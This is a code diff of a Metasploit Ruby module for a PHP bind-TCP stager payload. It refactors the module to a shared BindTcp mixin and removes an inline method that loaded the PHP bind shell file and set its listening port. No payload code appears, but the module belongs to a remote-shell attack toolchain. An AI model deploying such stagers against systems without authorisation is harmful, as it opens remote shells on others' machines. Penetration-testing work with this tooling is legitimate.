@@ -4,15 +4,15 @@
 ##
 
 require 'msf/core'
-require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
+require 'msf/core/payload/php/bind_tcp'
 
-module Metasploit3
+module Metasploit4
 
-  CachedSize = 1418
+  CachedSize = 1183
 
   include Msf::Payload::Stager
-  include Msf::Payload::Php
+  include Msf::Payload::Php::BindTcp
 
   def initialize(info = {})
     super(merge_info(info,
@@ -26,18 +26,5 @@ module Metasploit3
       'Stager'        => { 'Payload' => "" }
       ))
   end
-  def generate
-    bind = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'bind_tcp.php'))
-    bind.gsub!("4444", "#{datastore["LPORT"]}")
 
-    return super + bind
-  end
-
-  #
-  # PHP's read functions suck, make sure they know exactly how much data to
-  # grab by sending a length.
-  #
-  def handle_intermediate_stage(conn, payload)
-    conn.put([payload.length].pack("N"))
-  end
 end
